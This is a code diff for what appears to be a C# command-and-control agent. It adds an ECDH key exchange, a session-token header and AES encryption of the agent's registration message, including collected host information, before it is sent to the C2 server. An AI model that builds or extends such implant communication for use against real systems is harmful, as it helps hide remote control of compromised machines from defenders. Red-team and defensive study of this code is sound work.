@@ -15,6 +15,8 @@ using System.Runtime.Loader;
 using System.Xml.Linq;
 using System.Threading.Tasks;
 using Agent.Core.Utils;
+using System.Security.Cryptography;
+using Agent.Core.Utils.Encryption;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -23,6 +25,8 @@ AgentInformationService agentInformationService = new AgentInformationService();
 var baseTransformer = new BaseTransformer();
 var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
 var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
+var aesEncryptionDecorator = new AesEncryptionDecorator(baseTransformer);
+var aesDecryptionDecorator = new AesDecryptionDecorator(baseTransformer);
 
 // Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
@@ -54,9 +58,13 @@ var authRequest = new C2Request
 };
 
 var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
-var peerPublicKey = Convert.FromBase64String(authResponse.Result);
-Console.WriteLine("Auth response: " + authResponse.Result);
+Console.WriteLine(authResponse.Result);
+var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(authResponse.Result);
+
+var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
 byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);
+
+baseCommunicationService.SetHeader("Session-Token", decodedAuthResponse.SessionToken);
 
 // TEMP
 string jsonOutput = JsonSerializer.Serialize(baseConfig);
@@ -78,8 +86,11 @@ var registerRequest = new C2Request
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
+var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), JsonSerializer.Serialize(sharedSecret));
+Console.WriteLine(encryptedRegisterRequestMessage);
+
 // Init contact request
-var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(registerRequest));
+var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(encryptedRegisterRequestMessage));
 
 if (registrationResult is null)
 {
